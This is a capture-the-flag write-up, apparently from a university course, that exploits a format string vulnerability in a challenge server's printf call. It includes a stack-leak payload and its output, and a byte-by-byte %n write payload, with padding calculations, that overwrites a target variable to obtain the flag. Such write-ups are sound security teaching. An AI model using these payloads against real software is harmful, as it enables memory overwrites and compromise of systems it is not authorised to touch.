# Challenge `Write Big Number` writeup

- Vulnerability:
  - _Endpoint has a **format string** vulnerability_
- Where:
  - _`printf` endpoint_
- Impact:
  - _Allows to **read and write the stack values and arbitrary registers** without having the authority to by using the (vulnerable) printf function in the server's code_

## Steps to reproduce

First we need to open a session in the server `http://mustard.stt.rnl.tecnico.ulisboa.pt:22195`. After the session is established we can now start plotting what to do.

By analysing the source code provided, we can see that there is a buffer being used to store the input of the user. The buffer has a size of 128, and afterwards, in the function `vuln`, is printed. We can see that the `printf` function is being used to print the buffer, and it has a format string vulnerability. 

This means that we can send `%08x.` characters to print the stack values. We need to see where in the stack our buffer is and update the targets value to something different. To check the **target address** we used the gdb debugger with the corresponding **binary** file. To get it, we made a breakpoint in **vuln** and used the following command:

```bash
gdb-peda$ p &target
$1 = (unsigned int *) 0x804a044 <target>
```

Since we now have the address of the target we now need to know where in the stack the buffer starts. To do this we used the following payload:

```python
msg = (b"AAAA" + b"%08x."*20)
```

We obained: 
```bash
AAAAffffdc7c.0000007f.ffffdcd8.f7ffda74.00000001.f7fd3490.41414141.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.
Oops, not quite! Target was: 00000000
```

Because we used the string `AAAA` as a reference, we can see that the buffer starts in the 7th place. Having this information, we can now try to overwrite the target value. This time around, we need to make the target have this value: **0x0f5f1aa9**. In order to do this, the chosen method was byte by byte. First we got to overwrite every byte using this as the message payload:

```python
msg = (
        b"\x44\xa0\x04\x08" + 
        b"\x45\xa0\x04\x08" +
        b"\x46\xa0\x04\x08" +
        b"\x47\xa0\x04\x08" +
        b"%7$n"+
        b"%8$n"+
        b"%9$n"+
        b"%10$n"
       )
```
We successfully overwrote the target value to **10101010**. This means we now just have to make padding adjustments to get the desired value. The following calculations were made:

```
a9 - 10 = 153
11a - a9 = 113 (we need to overflow it)
5f - 1a = 69
10f -5f = 176 (we need to overflow it)
```

Since we have the paddings adjustments, we can now make the final payload:

```python
msg = (
        b"\x44\xa0\x04\x08" + 
        b"\x45\xa0\x04\x08" +
        b"\x46\xa0\x04\x08" +
        b"\x47\xa0\x04\x08" +
        b"%153x%7$n"+
        b"%113x%8$n"+
        b"%69x%9$n"+
        b"%176x%10$n"
       )

r.sendline(msg)

print(f"Flag: {r.recvall()}")

r.close()
```

Now, we can see that the server returned the `flag`. This means that we have successfully exploited the vulnerability and achieved our objective.

## Script

The script used can be found [here](write_big_number_poc.py)